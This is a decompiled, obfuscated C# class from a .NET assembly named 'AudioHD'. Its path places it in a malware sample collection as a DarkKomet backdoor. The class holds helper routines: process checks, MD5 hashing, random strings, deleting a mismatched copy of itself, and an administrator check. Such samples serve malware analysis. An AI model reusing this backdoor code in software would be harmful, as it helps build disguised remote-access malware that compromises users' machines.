// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

internal sealed class \u0003\u2000
{
  public void \u0002()
  {
    GC.Collect();
    GC.WaitForPendingFinalizers();
    if (Environment.OSVersion.Platform != PlatformID.Win32NT)
      return;
    \u0003\u2000.SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1);
  }

  public bool \u0002(string _param1) => Process.GetProcessesByName(_param1).Length > 0;

  private string \u0002(string _param1)
  {
    FileStream inputStream = File.OpenRead(_param1);
    byte[] hash = new MD5CryptoServiceProvider().ComputeHash((Stream) inputStream);
    inputStream.Close();
    return BitConverter.ToString(hash).Replace(\u0006\u2002.\u0002(-885875232), string.Empty).ToUpper();
  }

  public string \u0003(string _param1) => BitConverter.ToString(new MD5CryptoServiceProvider().ComputeHash(Encoding.Default.GetBytes(_param1))).Replace(\u0006\u2002.\u0002(-885875232), string.Empty).ToUpper();

  public string \u0002(int _param1)
  {
    Random random = new Random();
    string str = \u0006\u2002.\u0002(-885874812);
    string empty = string.Empty;
    for (int index = 0; index < _param1; ++index)
      empty += str.Substring(random.Next(0, str.Length), 1);
    return empty;
  }

  public bool \u0003(string _param1)
  {
    if (!File.Exists(_param1))
      return false;
    if (!(this.\u0002(_param1) != this.\u0002(Process.GetCurrentProcess().MainModule.FileName)))
      return true;
    File.Delete(_param1);
    return false;
  }

  public bool \u0002()
  {
    try
    {
      return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    }
    catch
    {
      return false;
    }
  }

  [DllImport("kernel32.dll")]
  private static extern int SetProcessWorkingSetSize(IntPtr _param0, int _param1, int _param2);
}
